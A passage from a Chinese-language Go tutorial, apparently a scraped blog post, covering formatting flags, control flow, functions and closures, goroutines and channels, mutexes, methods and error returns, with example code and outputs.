总是输出数值的正负号；对%q（%+q）会生成全部是ASCII字符的输出（通过转义）； ’ ‘ 对数值，正数前加空格而负数前加负号；对字符串采用%x或%X时（% x或% X）会给各打印的字节之间加空格 ’-’ 在输出右边填充空白而不是默认的左边（即从默认的右对齐切换为左对齐）； ’#’ 八进制数前加0（%#o），十六进制数前加0x（%#x）或0X（%#X），指针去掉前面的0x（%#p）对%q（%#q），对%U（%#U）会输出空格和单引号括起来的go字面值； ‘0’ 使用0而不是空格填充，对于数值类型会把填充的0放在正负号后面； 流程控制条件语句if条件语句switchswitch 语句用于基于不同条件执行不同动作，每一个 case 分支都是唯一的，从上直下逐一测试，直到匹配为止。 Golang switch 分支表达式可以是任意类型，不限于常量。可省略 break，默认自动终止。 12345678switch var1 &#123; case val1: ... case val2: ... default: ...&#125; 循环语句for12345678910111213for i, n := 0, len(s); i &lt; n; i++ &#123; // 常见的 for 循环，支持初始化语句。 println(s[i])&#125;n := len(s)for n &gt; 0 &#123; // 替代 while (n &gt; 0) &#123;&#125; println(s[n]) // 替代 for (; n &gt; 0;) &#123;&#125; n-- &#125;for &#123; // 替代 while (true) &#123;&#125; println(s) // 替代 for (;;) &#123;&#125;&#125; 12345678910111213for a := 0; a &lt; 10; a++ &#123; fmt.Printf(&quot;a 的值为: %d &quot;, a)&#125;for a &lt; b &#123; a++ fmt.Printf(&quot;a 的值为: %d &quot;, a) &#125;for i,x:= range numbers &#123; fmt.Printf(&quot;第 %d 位 x 的值 = %d &quot;, i,x)&#125; 循环控制Goto、Break、Continue 三个语句都可以配合标签(label)使用 标签名区分大小写，定以后若不使用会造成编译错误 continue、break配合标签(label)可用于多层循环跳出 goto是调整执行位置，与continue、break配合标签(label)的结果并不相同 函数golang函数特点12345678910• 无需声明原型。• 支持不定 变参。• 支持多返回值。• 支持命名返回参数。 • 支持匿名函数和闭包。• 函数也是一种类型，一个函数可以赋值给变量。• 不支持 嵌套 (nested) 一个包不能有两个名字一样的函数。• 不支持 重载 (overload) • 不支持 默认参数 (default parameter)。 函数声明函数声明包含一个函数名，参数列表， 返回值列表和函数体。如果函数没有返回值，则返回列表可以省略。函数从第一条语句开始执行，直到执行return语句或者执行函数的最后一条语句。 函数可以没有参数或接受多个参数。 注意类型在变量名之后 。 当两个或多个连续的函数命名参数是同一类型，则除了最后一个类型之外，其他都可以省略。 函数可以返回任意数量的返回值。 使用关键字 func 定义函数，左大括号依旧不能另起一行。 12345func test(x, y int, s string) (int, string) &#123; // 类型相同的相邻参数，参数类型可合并。 多返回值必须用括号。 n := x + y return n, fmt.Sprintf(s, n)&#125; 函数是第一类对象，可作为参数传递。建议将复杂签名定义为函数类型，以便于阅读。 1234567891011121314151617181920212223package mainimport &quot;fmt&quot;func test(fn func() int) int &#123; return fn()&#125;// 定义函数类型。type FormatFunc func(s string, x, y int) string func format(fn FormatFunc, s string, x, y int) string &#123; return fn(s, x, y)&#125;func main() &#123; s1 := test(func() int &#123; return 100 &#125;) // 直接将匿名函数当参数。 s2 := format(func(s string, x, y int) string &#123; return fmt.Sprintf(s, x, y) &#125;, &quot;%d, %d&quot;, 10, 20) println(s1, s2)&#125; 输出结果： 1100 10, 20 有返回值的函数，必须有明确的终止语句，否则会引发编译错误。 你可能会偶尔遇到没有函数体的函数声明，这表示该函数不是以Go实现的。这样的声明定义了函数标识符。 12package mathfunc Sin(x float64) float //implemented in assembly language 匿名函数1234func main() &#123;\tfunc(a, b int) &#123; fmt.Println(a + b)\t&#125;(1, 2) 初始化函数123func init() &#123;\tfmt.Println(123)&#125; Init 函数在 main 函数执行之前执行，可定义多个 init 函数，按顺序依次执行 可变参数函数1234567func add(nums ...int) int &#123;\ttotal := 0\tfor _, v := range nums &#123; total += v\t&#125;\treturn total&#125; 函数闭包12345678910111213141516171819202122232425262728ackage mainimport ( &quot;fmt&quot;)func a() func() int &#123; i := 0 b := func() int &#123; i++ fmt.Println(i) return i &#125; return b&#125;func main() &#123; c := a() c() c() c() a() //不会输出i&#125; 1 2 3 闭包复制的是原对象指针，这就很容易解释延迟引用现象。 1234567891011121314151617package mainimport &quot;fmt&quot;func test() func() &#123; x := 100 fmt.Printf(&quot;x (%p) = %d &quot;, &amp;x, x) return func() &#123; fmt.Printf(&quot;x (%p) = %d &quot;, &amp;x, x) &#125;&#125;func main() &#123; f := test() f()&#125; 输出: 12x (0xc42007c008) = 100x (0xc42007c008) = 100 在汇编层 ，test 实际返回的是 FuncVal 对象，其中包含了匿名函数地址、闭包对象指针。当调 匿名函数时，只需以某个寄存器传递该对象即可。 课后作业 &#x3D;&#x3D;&#x3D;&#x3D;》Base64 编码解码实现这里编码解码函数直接用 dongle 一个轻量级、语义化、对开发者友好的 golang 编码解码、加密解密和签名验签库 这边我们选择用 go mod 对导入 dongle 库 go mod init 项目目录 1232. ```shell go get -u github.com/golang-module/dongle Base64 编码解码 12dongle.Encode.FromString(text).ByBase64().ToString()dongle.Decode.FromString(cipher).ByBase64().ToString() 并发介绍进程和线程123A. 进程是程序在操作系统中的一次执行过程，系统进行资源分配和调度的一个独立单位。B. 线程是进程的一个执行实体,是CPU调度和分派的基本单位,它是比进程更小的能独立运行的基本单位。C. 一个进程可以创建和撤销多个线程;同一个进程中的多个线程之间可以并发执行。 并发和并行12A. 多线程程序在一个核的cpu上运行，就是并发。 B. 多线程程序在多个核的cpu上运行，就是并行。 并发 并行 协程和线程12协程：独立的栈空间，共享堆空间，调度由用户自己控制，本质上有点类似于用户级线程，这些用户级线程的调度也是自己实现的。线程：一个线程上可以跑多个协程，协程是轻量级的线程。 goroutine 只是由官方实现的超级”线程池”。每个实力4~5KB的栈内存占用和由于实现机制而大幅减少的创建和销毁开销是go高并发的根本原因。 并发不是并行：并发主要由切换时间片来实现”同时”运行，并行则是直接利用多核实现多线程的运行，go可以设置使用核数，以发挥多核计算机的能力。 goroutine 奉行通过通信来共享内存，而不是共享内存来通信。Goroutine在java&#x2F;c++中我们要实现并发编程的时候，我们通常需要自己维护一个线程池，并且需要自己去包装一个又一个的任务，同时需要自己去调度线程执行任务并维护上下文切换，这一切通常会耗费程序员大量的心智。那么能不能有一种机制，程序员只需要定义很多个任务，让系统去帮助我们把这些任务分配到CPU上实现并发执行呢？ Go语言中的goroutine就是这样一种机制，goroutine的概念类似于线程，但 goroutine是由Go的运行时（runtime）调度和管理的。Go程序会智能地将 goroutine 中的任务合理地分配给每个CPU。Go语言之所以被称为现代化的编程语言，就是因为它在语言层面已经内置了调度和上下文切换的机制。 在Go语言编程中你不需要去自己写进程、线程、协程，你的技能包里只有一个技能–goroutine，当你需要让某个任务并发执行的时候，你只需要把这个任务包装成一个函数，开启一个goroutine去执行这个函数就可以了，就是这么简单粗暴。 使用goroutineGo语言中使用goroutine非常简单，只需要在调用函数的时候在前面加上go关键字，就可以为一个函数创建一个goroutine。 一个goroutine必定对应一个函数，可以创建多个goroutine去执行相同的函数。 启动单个goroutine启动goroutine的方式非常简单，只需要在调用的函数（普通函数和匿名函数）前面加上一个go关键字。 1234567func hello() &#123;\tfmt.Println(&quot;Hello World&quot;)&#125;func main() &#123;\tgo hello()\tfmt.Println(&quot;Hello World in main&quot;)&#125; 发现 hello 函数好像没有执行，在程序启动时，Go程序就会为main()函数创建一个默认的goroutine。 当main()函数返回的时候该goroutine就结束了，所有在main()函数中启动的goroutine会一同结束，main函数所在的goroutine就像是权利的游戏中的夜王，其他的goroutine都是异鬼，夜王一死它转化的那些异鬼也就全部GG了。 所以我们要想办法让main函数等一等hello函数，最简单粗暴的方式就是time.Sleep了。 1time.Sleep(time.Second) 首先为什么会先打印Hello World in main是因为我们在创建新的goroutine的时候需要花费一些时间，而此时main函数所在的goroutine是继续执行的。 启动多个goroutine在Go语言中实现并发就是这样简单，我们还可以启动多个goroutine。让我们再来一个例子： （这里使用了sync.WaitGroup来实现goroutine的同步） 123456789101112131415161718192021package mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)var wg sync.WaitGroupfunc hello(i int) &#123;\tdefer wg.Done() // goroutine结束就登记-1\tfmt.Println(&quot;Hello World&quot;)&#125;func main() &#123;\tfor i := 0; i &lt; 10; i++ &#123; wg.Add(1) // 启动一个goroutine就登记+1 go hello(i) &#125; wg.Wait() // 等待所有登记的goroutine都结束\tfmt.Println(&quot;Hello World in main&quot;)&#125; 多次执行上面的代码，会发现每次打印的数字的顺序都不一致。这是因为10个goroutine是并发执行的，而goroutine的调度是随机的。 ⚠️注意 如果主协程退出了，其他任务还执行吗（运行下面的代码测试一下吧） 123456789101112131415161718192021222324252627package mainimport ( &quot;fmt&quot; &quot;time&quot;)func main() &#123; // 合起来写 go func() &#123; i := 0 for &#123; i++ fmt.Printf(&quot;new goroutine: i = %d &quot;, i) time.Sleep(time.Second) &#125; &#125;() i := 0 for &#123; i++ fmt.Printf(&quot;main goroutine: i = %d &quot;, i) time.Sleep(time.Second) if i == 2 &#123; break &#125; &#125;&#125; 1234main goroutine: i = 1new goroutine: i = 1new goroutine: i = 2main goroutine: i = 2 goroutine与线程可增长的栈 OS线程（操作系统线程）一般都有固定的栈内存（通常为2MB）,一个goroutine的栈在其生命周期开始时只有很小的栈（典型情况下2KB），goroutine的栈不是固定的，他可以按需增大和缩小，goroutine的栈大小限制可以达到1GB，虽然极少会用到这个大。所以在Go语言中一次创建十万左右的goroutine也是可以的。 goroutine调度GPM是Go语言运行时（runtime）层面的实现，是go语言自己实现的一套调度系统。区别于操作系统调度OS线程。 1.G很好理解，就是个goroutine的，里面除了存放本goroutine信息外 还有与所在P的绑定等信息。 2.P管理着一组goroutine队列，P里面会存储当前goroutine运行的上下文环境（函数指针，堆栈地址及地址边界），P会对自己管理的goroutine队列做一些调度（比如把占用CPU时间较长的goroutine暂停、运行后续的goroutine等等）当自己的队列消费完了就去全局队列里取，如果全局队列里也消费完了会去其他P的队列里抢任务。 3.M（machine）是Go运行时（runtime）对操作系统内核线程的虚拟， M与内核线程一般是一一映射的关系， 一个groutine最终是要放到M上执行的； P与M一般也是一一对应的。他们关系是： P管理着一组G挂载在M上运行。当一个G长久阻塞在一个M上时，runtime会新建一个M，阻塞G所在的P会把其他的G 挂载在新建的M上。当旧的G阻塞完成或者认为其已经死掉时 回收旧的M。 P的个数是通过runtime.GOMAXPROCS设定（最大256），Go1.5版本之后默认为物理线程数。 在并发量大的时候会增加一些P和M，但不会太多，切换太频繁的话得不偿失。 单从线程调度讲，Go语言相比起其他语言的优势在于OS线程是由OS内核来调度的，goroutine则是由Go运行时（runtime）自己的调度器调度的，这个调度器使用一个称为m:n调度的技术（复用&#x2F;调度m个goroutine到n个OS线程）。 其一大特点是goroutine的调度是在用户态下完成的， 不涉及内核态与用户态之间的频繁切换，包括内存的分配与释放，都是在用户态维护着一块大的内存池， 不直接调用系统的malloc函数（除非内存池需要改变），成本比调度OS线程低很多。 另一方面充分利用了多核的硬件资源，近似的把若干goroutine均分在物理线程上， 再加上本身goroutine的超轻量，以上种种保证了go调度方面的性能。 runtime包runtime.Gosched()让出CPU时间片，重新等待安排任务(大概意思就是本来计划的好好的周末出去烧烤，但是你妈让你去相亲,两种情况第一就是你相亲速度非常快，见面就黄不耽误你继续烧烤，第二种情况就是你相亲速度特别慢，见面就是你侬我侬的，耽误了烧烤，但是还馋就是耽误了烧烤你还得去烧烤) 12345678910111213141516171819202122package mainimport (\t&quot;fmt&quot;\t&quot;runtime&quot;)func main() &#123;\t// 协程\tgo func(s string) &#123; for i := 0; i &lt; 2; i++ &#123; fmt.Println(s) &#125;\t&#125;(&quot;Hello&quot;)\t// 主协程\tfor i := 0; i &lt; 2; i++ &#123; // 切一下，再分配任务 runtime.Gosched() fmt.Println(&quot;hello&quot;)\t&#125;&#125; runtime.Goexit()退出当前协程(一边烧烤一边相亲，突然发现相亲对象太丑影响烧烤，果断让她滚蛋，然后也就没有然后了) 12345678910111213141516171819202122package mainimport ( &quot;fmt&quot; &quot;runtime&quot;)func main() &#123; go func() &#123; defer fmt.Println(&quot;A.defer&quot;) func() &#123; defer fmt.Println(&quot;B.defer&quot;) // 结束协程 runtime.Goexit() defer fmt.Println(&quot;C.defer&quot;) fmt.Println(&quot;B&quot;) &#125;() fmt.Println(&quot;A&quot;) &#125;() for &#123; &#125;&#125; runtime.GOMAXPROCSGo运行时的调度器使用GOMAXPROCS参数来确定需要使用多少个OS线程来同时执行Go代码。默认值是机器上的CPU核心数。例如在一个8核心的机器上，调度器会把Go代码同时调度到8个OS线程上（GOMAXPROCS是m:n调度中的n）。 Go语言中可以通过runtime.GOMAXPROCS()函数设置当前程序并发时占用的CPU逻辑核心数。 Go1.5版本之前，默认使用的是单核心执行。Go1.5版本之后，默认使用全部的CPU逻辑核心数。 我们可以通过将任务分配到不同的CPU逻辑核心上实现并行的效果，这里举个例子： Go语言中的操作系统线程和goroutine的关系： 1.一个操作系统线程对应用户态多个goroutine。 2.go程序可以同时使用多个操作系统线程。 3.goroutine和OS线程是多对多的关系，即m:n。 Channel单纯地将函数并发执行是没有意义的。函数与函数间需要交换数据才能体现并发执行函数的意义。 虽然可以使用共享内存进行数据交换，但是共享内存在不同的goroutine中容易发生竞态问题。为了保证数据交换的正确性，必须使用互斥量对内存进行加锁，这种做法势必造成性能问题。 Go语言的并发模型是CSP（Communicating Sequential Processes），提倡通过通信共享内存而不是通过共享内存而实现通信。 如果说goroutine是Go程序并发的执行体，channel就是它们之间的连接。channel是可以让一个goroutine发送特定值到另一个goroutine的通信机制。 Go 语言中的通道（channel）是一种特殊的类型。通道像一个传送带或者队列，总是遵循先入先出（First In First Out）的规则，保证收发数据的顺序。每一个通道都是一个具体类型的导管，也就是声明channel的时候需要为其指定元素类型。 channel类型channel是一种类型，一种引用类型。声明通道类型的格式如下： 1234 var 变量 chan 元素类型var ch1 chan int // 声明一个传递整型的通道 var ch2 chan bool // 声明一个传递布尔型的通道 var ch3 chan []int // 声明一个传递int切片的通道 创建channel通道是引用类型，通道类型的空值是nil。 12var ch chan intfmt.Println(ch) // &lt;nil&gt; 声明的通道后需要使用make函数初始化之后才能使用。 创建channel的格式如下： 1make(chan 元素类型, [缓冲大小]) channel的缓冲大小是可选的。 举几个例子： 123ch4 := make(chan int)ch5 := make(chan bool)ch6 := make(chan []int) channel操作通道有发送（send）、接收(receive）和关闭（close）三种操作。 发送和接收都使用&lt;-符号。 现在我们先使用以下语句定义一个通道： 1ch := make(chan int) 发送将一个值发送到通道中。 1ch &lt;- 10 // 把10发送到ch中 接收从一个通道中接收值。 12x := &lt;- ch // 从ch中接收值并赋值给变量x&lt;-ch // 从ch中接收值，忽略结果 关闭我们通过调用内置的close函数来关闭通道。 1close(ch) 关于关闭通道需要注意的事情是，只有在通知接收方goroutine所有的数据都发送完毕的时候才需要关闭通道。通道是可以被垃圾回收机制回收的，它和关闭文件是不一样的，在结束操作之后关闭文件是必须要做的，但关闭通道不是必须的。 关闭后的通道有以下特点： 12341.对一个关闭的通道再发送值就会导致panic。2.对一个关闭的通道进行接收会一直获取值直到通道为空。3.对一个关闭的并且没有值的通道执行接收操作会得到对应类型的零值。4.关闭一个已经关闭的通道会导致panic。 无缓冲的通道 无缓冲的通道又称为阻塞的通道。我们来看一下下面的代码： 12345func main() &#123; ch := make(chan int) ch &lt;- 10 fmt.Println(&quot;发送成功&quot;)&#125; 上面这段代码能够通过编译，但是执行的时候会出现以下错误： 12345fatal error: all goroutines are asleep - deadlock!goroutine 1 [chan send]:main.main() .../src/github.com/pprof/studygo/day06/channel02/main.go:8 +0x54 为什么会出现deadlock错误呢？ 因为我们使用ch :&#x3D; make(chan int)创建的是无缓冲的通道，无缓冲的通道只有在有人接收值的时候才能发送值。就像你住的小区没有快递柜和代收点，快递员给你打电话必须要把这个物品送到你的手中，简单来说就是无缓冲的通道必须有接收才能发送。 上面的代码会阻塞在ch &lt;- 10这一行代码形成死锁，那如何解决这个问题呢？ 一种方法是启用一个goroutine去接收值，例如： 123456789101112131415package mainimport &quot;fmt&quot;func recv(ch chan int) &#123;\tret := &lt;-ch\tfmt.Println(ret, &quot;接收成功&quot;)&#125;func main() &#123;\t// 定义一个通道\tch := make(chan int)\tgo recv(ch)\tch &lt;- 10\tfmt.Println(ch, &quot;发送成功&quot;)&#125; 无缓冲通道上的发送操作会阻塞，直到另一个goroutine在该通道上执行接收操作，这时值才能发送成功，两个goroutine将继续执行。相反，如果接收操作先执行，接收方的goroutine将阻塞，直到另一个goroutine在该通道上发送一个值。 使用无缓冲通道进行通信将导致发送和接收的goroutine同步化。因此，无缓冲通道也被称为同步通道 有缓冲的通道解决上面问题的方法还有一种就是使用有缓冲区的通道。 我们可以在使用make函数初始化通道的时候为其指定通道的容量，例如： 12345func main() &#123; ch := make(chan int, 1) // 创建一个容量为1的有缓冲区通道 ch &lt;- 10 fmt.Println(&quot;发送成功&quot;)&#125; 只要通道的容量大于零，那么该通道就是有缓冲的通道，通道的容量表示通道中能存放元素的数量。就像你小区的快递柜只有那么个多格子，格子满了就装不下了，就阻塞了，等到别人取走一个快递员就能往里面放一个。 我们可以使用内置的len函数获取通道内元素的数量，使用cap函数获取通道的容量，虽然我们很少会这么做。 close()可以通过内置的close()函数关闭channel（如果你的管道不往里存值或者取值的时候一定记得关闭管道） 123456789101112131415161718192021package mainimport &quot;fmt&quot;func main() &#123; c := make(chan int) go func() &#123; for i := 0; i &lt; 5; i++ &#123; c &lt;- i &#125; close(c) &#125;() for &#123; if data, ok := &lt;-c; ok &#123; fmt.Println(data) &#125; else &#123; break &#125; &#125; fmt.Println(&quot;main结束&quot;)&#125; 单向通道有的时候我们会将通道作为参数在多个任务函数间传递，很多时候我们在不同的任务函数中使用通道都会对其进行限制，比如限制通道在函数中只能发送或只能接收。 Go语言中提供了单向通道来处理这种情况。例如，我们把上面的例子改造如下： 1234567891011121314151617181920212223242526func counter(out chan&lt;- int) &#123; for i := 0; i &lt; 100; i++ &#123; out &lt;- i &#125; close(out)&#125;func squarer(out chan&lt;- int, in &lt;-chan int) &#123; for i := range in &#123; out &lt;- i * i &#125; close(out)&#125;func printer(in &lt;-chan int) &#123; for i := range in &#123; fmt.Println(i) &#125;&#125;func main() &#123; ch1 := make(chan int) ch2 := make(chan int) go counter(ch1) go squarer(ch2, ch1) printer(ch2)&#125; 其中， 121.chan&lt;- int是一个只能发送的通道，可以发送但是不能接收；2.&lt;-chan int是一个只能接收的通道，可以接收但是不能发送。 在函数传参及任何赋值操作中将双向通道转换为单向通道是可以的，但反过来是不可以的。 通道总结channel常见的异常总结，如下图： 注意:关闭已经关闭的channel也会引发panic。 定时器Timer时间到了，执行只执行1次 1234567891011121314package mainimport ( &quot;fmt&quot; &quot;time&quot;)func main() &#123; timer := time.NewTimer(time.Second) fmt.Println(&quot;Timer started...&quot;) &lt;-timer.C // 等待定时器触发 fmt.Println(&quot;Timer expired!&quot;)&#125; Ticker时间到了，多次执行 1234567891011121314151617181920212223package mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tticker := time.NewTicker(1 * time.Second)\ti := 0\tgo func() &#123; for &#123; i++ fmt.Println(&lt;-ticker.C) if i == 5 &#123; ticker.Stop() &#125; &#125;\t&#125;()\tfor &#123;\t&#125;&#125; selectselect多路复用在某些场景下我们需要同时从多个通道接收数据。通道在接收数据时，如果没有数据可以接收将会发生阻塞。你也许会写出如下代码使用遍历的方式来实现： select的使用类似于switch语句，它有一系列case分支和一个默认的分支。每个case会对应一个通道的通信（接收或发送）过程。select会一直等待，直到某个case的通信操作完成时，就会执行case分支对应的语句。具体格式如下： 12345678910111213141516171819202122232425262728293031package mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func test1(ch chan string) &#123;\ttime.Sleep(time.Second * 5)\tch &lt;- &quot;test1&quot;&#125;func test2(ch chan string) &#123;\ttime.Sleep(time.Second * 2)\tch &lt;- &quot;test2&quot;&#125;func main() &#123;\t// 2个管道\toutput1 := make(chan string)\toutput2 := make(chan string)\t// 跑2个子协程，写数据\tgo test1(output1)\tgo test2(output2)\t// 用select监控\tselect &#123;\tcase s1 := &lt;-output1: fmt.Println(&quot;s1=&quot;, s1)\tcase s2 := &lt;-output2: fmt.Println(&quot;s2=&quot;, s2)\t&#125;&#125; 如果多个channel同时ready，则随机选择一个执行 12345678910111213141516171819202122232425package mainimport ( &quot;fmt&quot;)func main() &#123; // 创建2个管道 int_chan := make(chan int, 1) string_chan := make(chan string, 1) go func() &#123; //time.Sleep(2 * time.Second) int_chan &lt;- 1 &#125;() go func() &#123; string_chan &lt;- &quot;hello&quot; &#125;() select &#123; case value := &lt;-int_chan: fmt.Println(&quot;int:&quot;, value) case value := &lt;-string_chan: fmt.Println(&quot;string:&quot;, value) &#125; fmt.Println(&quot;main结束&quot;)&#125; 并发安全和锁有时候在Go代码中可能会存在多个goroutine同时操作一个资源（临界区），这种情况会发生竞态问题（数据竞态）。类比现实生活中的例子有十字路口被各个方向的的汽车竞争；还有火车上的卫生间被车厢里的人竞争。 1234567891011121314151617181920212223242526272829package mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)var x int64var wg sync.WaitGroupfunc add() &#123;\tfor i := 0; i &lt; 5000; i++ &#123; x = x + 1\t&#125;\twg.Done()&#125;func sub() &#123;\tfor i := 0; i &lt; 5000; i++ &#123; x = x - 1\t&#125;\twg.Done()&#125;func main() &#123;\twg.Add(2)\tgo add()\tgo sub()\twg.Wait()\tfmt.Println(x)&#125; 上面的代码中我们开启了两个goroutine去加减x的值，这两个goroutine在访问和修改x变量的时候就会存在数据竞争，导致最后的结果不是 0。 互斥锁互斥锁是一种常用的控制共享资源访问的方法，它能够保证同时只有一个goroutine可以访问共享资源。Go语言中使用sync包的Mutex类型来实现互斥锁。 使用互斥锁来修复上面代码的问题： 12345678910111213141516171819202122232425262728293031323334package mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)var x int64var wg sync.WaitGroupvar lock sync.Mutexfunc add() &#123;\tfor i := 0; i &lt; 5000; i++ &#123; lock.Lock() //加锁 x = x + 1 lock.Unlock() //解锁\t&#125;\twg.Done()&#125;func sub() &#123;\tfor i := 0; i &lt; 5000; i++ &#123; lock.Lock() //加锁 x = x - 1 lock.Unlock() //解锁\t&#125;\twg.Done()&#125;func main() &#123;\twg.Add(2)\tgo add()\tgo sub()\twg.Wait()\tfmt.Println(x)&#125; 方法Golang 方法总是绑定对象实例，并隐式将实例作为第一实参 (receiver)。 12345• 只能为当前包内命名类型定义方法。• 参数 receiver 可任意命名。如方法中未曾使用 ，可省略参数名。• 参数 receiver 类型可以是 T 或 *T。基类型 T 不能是接口或指针。 • 不支持方法重载，receiver 只是参数签名的组成部分。• 可用实例 value 或 pointer 调用全部方法，编译器自动转换。 一个方法就是一个包含了接受者的函数，接受者可以是命名类型或者结构体类型的一个值或者是一个指针。 所有给定类型的方法属于该类型的方法集 方法定义123func (recevier type) methodName(参数列表)(返回值列表)&#123;&#125; 参数和返回值可以省略 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package maintype Test struct&#123;&#125;// 无参数、无返回值func (t Test) method0() &#123;&#125;// 单参数、无返回值func (t Test) method1(i int) &#123;&#125;// 多参数、无返回值func (t Test) method2(x, y int) &#123;&#125;// 无参数、单返回值func (t Test) method3() (i int) &#123; return&#125;// 多参数、多返回值func (t Test) method4(x, y int) (z int, err error) &#123; return&#125;// 无参数、无返回值func (t *Test) method5() &#123;&#125;// 单参数、无返回值func (t *Test) method6(i int) &#123;&#125;// 多参数、无返回值func (t *Test) method7(x, y int) &#123;&#125;// 无参数、单返回值func (t *Test) method8() (i int) &#123; return&#125;// 多参数、多返回值func (t *Test) method9(x, y int) (z int, err error) &#123; return&#125;func main() &#123;&#125; 下面定义一个结构体类型和该类型的一个方法： 1234567891011121314151617181920212223package mainimport &quot;fmt&quot;type User struct &#123;\tname string\tage int&#125;// 方法func (u User) Notify() &#123;\tfmt.Printf(&quot;name: %v, age: %v &quot;, u.name, u.age)&#125;\tfunc main() &#123;\t// 创建对象\tuser := User&#123;&quot;Tom&quot;, 18&#125;\tuser.Notify()\tuser2 := User&#123;&quot;Jerry&quot;, 20&#125;\tuser3 := &amp;user2\tuser3.Notify()&#125; 12name: Tom, age: 18name: Jerry, age: 20 注意：当接受者是指针时，即使用值类型调用那么函数内部也是对指针的操作。 方法不过是一种特殊的函数，只需将其还原，就知道 receiver T 和 *T 的差别。 123456789101112131415161718192021222324252627package mainimport &quot;fmt&quot;type Data struct &#123; x int&#125;func (self Data) ValueTest() &#123; // func ValueTest(self Data); fmt.Printf(&quot;Value: %p &quot;, &amp;self)&#125;func (self *Data) PointerTest() &#123; // func PointerTest(self *Data); fmt.Printf(&quot;Pointer: %p &quot;, self)&#125;func main() &#123; d := Data&#123;&#125; p := &amp;d fmt.Printf(&quot;Data: %p &quot;, p) d.ValueTest() // ValueTest(d) d.PointerTest() // PointerTest(&amp;d) p.ValueTest() // ValueTest(*p) p.PointerTest() // PointerTest(p)&#125; 12345Data: 0x1400000e108Value: 0x1400000e118Pointer: 0x1400000e108Value: 0x1400000e120Pointer: 0x1400000e108 普通函数与方法的区别1.对于普通函数，接收者为值类型时，不能将指针类型的数据直接传递，反之亦然。 2.对于方法（如struct的方法），接收者为值类型时，可以直接用指针类型的变量调用方法，反过来同样也可以。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package main//普通函数与方法的区别（在接收者分别为值类型和指针类型的时候）import &quot;fmt&quot;// 1.普通函数// 接收值类型参数的函数func valueIntTest(a int) int &#123;\treturn a + 10&#125;// 接收指针类型参数的函数func pointerIntTest(a *int) int &#123;\treturn *a + 10&#125;func structTestValue() &#123;\ta := 2\tfmt.Println(&quot;valueIntTest:&quot;, valueIntTest(a))\t//函数的参数为值类型，则不能直接将指针作为参数传递\t//fmt.Println(&quot;valueIntTest:&quot;, valueIntTest(&amp;a))\t//compile error: cannot use &amp;a (type *int) as type int in function argument\tb := 5\tfmt.Println(&quot;pointerIntTest:&quot;, pointerIntTest(&amp;b))\t//同样，当函数的参数为指针类型时，也不能直接将值类型作为参数传递\t//fmt.Println(&quot;pointerIntTest:&quot;, pointerIntTest(b))\t//cannot use b (variable of type int) as *int value in argument to pointerIntTest&#125;//2.方法type PersonD struct &#123; id int name string&#125;//接收者为值类型func (p PersonD) valueShowName() &#123; fmt.Println(p.name)&#125;//接收者为指针类型func (p *PersonD) pointShowName() &#123; fmt.Println(p.name)&#125;func structTestFunc() &#123; //值类型调用方法 personValue := PersonD&#123;101, &quot;hello world&quot;&#125; personValue.valueShowName() personValue.pointShowName() //指针类型调用方法 personPointer := &amp;PersonD&#123;102, &quot;hello golang&quot;&#125; personPointer.valueShowName() personPointer.pointShowName() //与普通函数不同，接收者为指针类型和值类型的方法，指针类型和值类型的变量均可相互调用&#125;func main() &#123;\tstructTestValue()\tstructTestFunc()&#125; 123456valueIntTest: 12pointerIntTest: 15hello worldhello worldhello golanghello golang 匿名字段Golang匿名字段 ：可以像字段成员那样访问匿名字段方法，编译器负责查找。 12345678910111213141516171819202122package mainimport &quot;fmt&quot;type User struct &#123; id int name string&#125;type Manager struct &#123; User&#125;func (self *User) ToString() string &#123; // receiver = &amp;(Manager.User) return fmt.Sprintf(&quot;User: %p, %v&quot;, self, self)&#125;func main() &#123; m := Manager&#123;User&#123;1, &quot;Tom&quot;&#125;&#125; fmt.Printf(&quot;Manager: %p &quot;, &amp;m) fmt.Println(m.ToString())&#125; 12Manager: 0x140000a4018User: 0x140000a4018, &amp;&#123;1 Tom&#125; 通过匿名字段，可获得和继承类似的复用能力。依据编译器查找次序，只需在外层定义同名方法，就可以实现 “override”。 1234567891011121314151617181920212223242526272829package mainimport &quot;fmt&quot;type User struct &#123; id int name string&#125;type Manager struct &#123; User title string&#125;func (self *User) ToString() string &#123; return fmt.Sprintf(&quot;User: %p, %v&quot;, self, self)&#125;func (self *Manager) ToString() string &#123; return fmt.Sprintf(&quot;Manager: %p, %v&quot;, self, self)&#125;func main() &#123; m := Manager&#123;User&#123;1, &quot;Tom&quot;&#125;, &quot;Administrator&quot;&#125; fmt.Println(m.ToString()) fmt.Println(m.User.ToString())&#125; 12Manager: 0x14000194090, &amp;&#123;&#123;1 Tom&#125; Administrator&#125;User: 0x14000194090, &amp;&#123;1 Tom&#125; 方法集Golang方法集 ：每个类型都有与之关联的方法集，这会影响到接口实现规则。 12345• 类型 T 方法集包含全部 receiver T 方法。• 类型 *T 方法集包含全部 receiver T + *T 方法。• 如类型 S 包含匿名字段 T，则 S 和 *S 方法集包含 T 方法。 • 如类型 S 包含匿名字段 *T，则 S 和 *S 方法集包含 T + *T 方法。 • 不管嵌入 T 或 *T，*S 方法集总是包含 T + *T 方法。 用实例 value 和 pointer 调用方法 (含匿名字段) 不受方法集约束，编译器总是查找全部方法，并自动转换 receiver 实参。 Go 语言中内部类型方法集提升的规则： 表达式Golang 表达式 ：根据调用者不同，方法分为两种表现形式: 1instance.method(args...) ---&gt; &lt;type&gt;.func(instance, args...) 前者称为 method value，后者 method expression。 两者都可像普通函数那样赋值和传参，区别在于 method value 绑定实例，而 method expression 则须显式传参。 1234567891011121314151617181920212223package mainimport &quot;fmt&quot;type User struct &#123; id int name string&#125;func (self *User) Test() &#123; fmt.Printf(&quot;%p, %v &quot;, self, self)&#125;func main() &#123; u := User&#123;1, &quot;Tom&quot;&#125; u.Test() mValue := u.Test mValue() // 隐式传递 receiver mExpression := (*User).Test mExpression(&amp;u) // 显式传递 receiver&#125; 错误控制返回错误值123456789101112131415161718192021222324package mainimport (\t&quot;errors&quot;\t&quot;fmt&quot;)func divide(a, b int) (int, error) &#123;\tif b == 0 &#123; return 0, errors.New(&quot;除数不能为0&quot;)\t&#125; else &#123; return a / b, nil\t&#125;&#125;func main() 